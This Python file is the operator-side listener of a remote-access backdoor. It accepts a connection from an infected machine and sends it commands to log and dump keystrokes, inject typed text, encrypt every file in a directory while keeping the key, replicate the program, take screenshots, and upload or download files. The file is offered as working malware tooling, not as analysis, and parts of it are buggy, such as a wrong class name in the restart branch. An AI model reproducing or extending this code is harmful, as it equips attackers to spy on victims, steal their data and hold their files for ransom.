
import socket
import json
import time
import sys
import base64
import os
from logos import Logo
from termcolor import colored

class listener:
	"""This is the Listener class. (only works with its own reverse_backdoor)"""
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(5)
		logo = Logo()
		logo.listener_logo()
		animation = "|/-\\"
		start_time = time.time()
		
		# Animation for waiting for connection window
		while True:
    			for i in range(4):
        			time.sleep(0.2)
        			sys.stdout.write(colored("\r[+]", 'green') + " Listening for incoming connections" + " [" + animation[i % len(animation)] + "]")
        			sys.stdout.flush()
    			if time.time() - start_time > 3:
        			break
		
		self.connection, address = listener.accept()
		print(colored("\n[+]", "green") + " Connection from " + str(address) + '\n')
	
	# method called when (help) command detected
	def command_menu(self):
		command_list = ['help', ' download', ' upload', ' type:   Send complete words',' keylogger <(start) (stop) (dump)>', ' encrypt:   Encrypt all files in a directory', ' decrypt', ' replicate: Copy the programm to a folder', ' screenshot <filepath/name>',' restart:   Reset the connection','exit:   Close the connection', 'terminate:   Terminate the session on both sides']
		print(colored("\n[-]", 'magenta', attrs=['bold']) + colored(" COMMAND MENU:\n", attrs=['bold']))
		for i in range(1, len(command_list)):
			print(colored("[", 'yellow') + colored(str(i), 'yellow') + colored("] ", 'yellow') + command_list[i])
		print("\n")
	
	# Serialization of data for sending
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())
	
	# Serialization of data for receiving
	def reliable_receive(self):
		json_data = " "
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
				
	def write_file(self, path, content):
		print(colored("[!]", 'yellow') + " Downloading file contents. It may take a while depending on the file size!")
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return colored("[+]", 'green') + " Downloaded file successfully!\n"
			
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
	
	def execute_remotely(self, command):
		if command[0] == "keylogger" and command[1] == "start":
			self.reliable_send(command)
			print(colored("[+]", 'green') + " Key logger Activated!")
			
		elif command[0] == "keylogger" and command[1] == "dump":
			self.reliable_send(command)
			print(colored("[!]", 'yellow') + " Key logger recieving keystrokes!...")
			time.sleep(1)
			return self.connection.recv(1024)
			
		elif command[0] == "keylogger" and command[1] == "stop":
			self.reliable_send(command)
			print(colored("[*]", 'red') + " Key logger Deactivated!")
			
		elif command[0] == "type":
			self.reliable_send(command)
			print((colored("\n[+]", 'green') + " Keys sent successfully!"))
			
						
		elif command[0] == "encrypt":
			self.reliable_send(command)
			content = self.reliable_receive()
			with open("thekey.key", "wb") as Key:
				Key.write(content)
			print(colored("\n[+]", 'green') + " Files encrypted successfully!")
			
		elif command[0] == "decrypt":
			file_content = self.read_file("thekey.key")
			command.append(file_content)
			self.reliable_send(command)
			return self.reliable_receive()
			
		elif command[0] == "screenshot":
			self.reliable_send(command)
			picture = self.reliable_receive()
			with open(command[1], "wb") as file:
				file.write(base64.b64decode(picture))
			print(colored("\n[+]", 'green') + " Screenshot saved successfully!")
			
		elif command[0] == "help":
			self.command_menu()
		
		elif command[0] == "exit":
			self.reliable_send(command)
			print(colored("[!]", 'yellow') + " Closing connection!")
			time.sleep(1)
			self.connection.close()
			exit()
			
		elif command[0] == "terminate":
			self.reliable_send(command)
			print(colored("[!]", 'yellow') + " Terminating the session!")
			time.sleep(2)
			self.connection.close()
			exit()
		else:
			self.reliable_send(command)
			return self.reliable_receive()
	

	def run(self):
		while True:
			command = input(colored(">> ", 'red'))
			command = command.split(" ")
			
			try:
				if command[0] == 'upload':
					print(colored("\n[!]", 'yellow') + " Uploading file contents. It may take a while depending on the file size!")
					file_content = self.read_file(command[1])
					command.append(file_content)
				
				result = self.execute_remotely(command)
			
				if command[0] == "download" and "[!] Error" not in result:
					result = self.write_file(command[1], result)
					
				elif command[0] == "dump_keys" and "[!] Error" not in result:
					print(colored("[+]", 'green', attrs=['bold']) + colored(" Recieved Keystrokes: ", 'yellow', attrs=['bold']))
					
				elif command[0] == "restart":
					os.system("clear")
					print(colored("[!]", 'yellow') + " Restarting the connection!")
					time.sleep(2)
					self.reliable_send(command)
					my_listener = Listener("192.168.150.128", 4444)
					while True:
						my_listener.run()
			except Exception:
				result = colored("[!] Error during command execution!", 'red', attrs=['bold'])
				
			print("\n" + str(result) + "\n")
	
	
